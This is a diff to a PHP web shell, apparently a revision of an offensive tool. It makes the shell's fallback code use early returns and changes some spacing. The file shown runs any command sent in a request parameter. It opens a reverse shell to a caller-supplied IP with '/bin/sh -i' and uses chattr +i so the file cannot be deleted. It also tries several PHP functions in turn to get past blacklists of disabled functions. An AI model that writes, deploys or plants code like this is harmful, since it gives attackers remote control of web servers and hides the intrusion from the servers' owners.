@@ -12,7 +12,7 @@
 # attempt to protect myself from deletion.
 $this_file = __FILE__;
 @system("chmod ugo-w $this_file");
-@system("chattr +i $this_file");
+@system("chattr +i   $this_file");
 
 # name of the parameter (GET  or POST) for the command.
 # change this if the target already use this parameter.
@@ -28,8 +28,10 @@ if (isset($_REQUEST[$cmd])) {
    # on apache logs)
    $command = $_REQUEST[$cmd];
    executeCommand($command);
-} else if (isset($_REQUEST[$ip]) && !isset($_REQUEST[$cmd])) {
+   die();
+}
 
+if (isset($_REQUEST[$ip]) && !isset($_REQUEST[$cmd])) {
    $ip = $_REQUEST[$ip];
 
    # default port 443
@@ -40,7 +42,7 @@ if (isset($_REQUEST[$cmd])) {
    }
 
    # nc -nlvp 443
-   $sock = fsockopen($ip, $port);
+   $sock    = fsockopen($ip, $port);
    $command = '/bin/sh -i <&3 >&3 2>&3';
 
    executeCommand($command);
@@ -57,27 +59,36 @@ function executeCommand(string $command)
       # http://php.net/manual/en/class.reflectionfunction.php
       $function = new ReflectionFunction('system');
       $function->invoke($command);
-   } elseif (function_exists('call_user_func_array')) {
+      return;
+   }
 
+   if (function_exists('call_user_func_array')) {
       # http://php.net/manual/en/function.call-user-func-array.php
       call_user_func_array('system', array($command));
-   } elseif (function_exists('call_user_func')) {
+      return;
+   }
 
+   if (function_exists('call_user_func')) {
       # http://php.net/manual/en/function.call-user-func.php
       call_user_func('system', $command);
-   } else if (function_exists('passthru')) {
+      return;
+   }
 
+   if (function_exists('passthru')) {
       # https://www.php.net/manual/en/function.passthru.php
       ob_start();
       passthru($command, $return_var);
       $output = ob_get_contents();
       ob_end_clean();
-   } else if (function_exists('system')) {
+      return;
+   }
 
-      # this is the last resort. chances are PHP Suhosin
-      # has system() on a blacklist anyways :>
-
+   if (function_exists('system')) {
+      # this  is  the  last  resort.  chances  are  php
+      # subhosting has system()  on a blacklist anyways
+      # :>
       # http://php.net/manual/en/function.system.php
       system($command);
+      return;
    }
 }
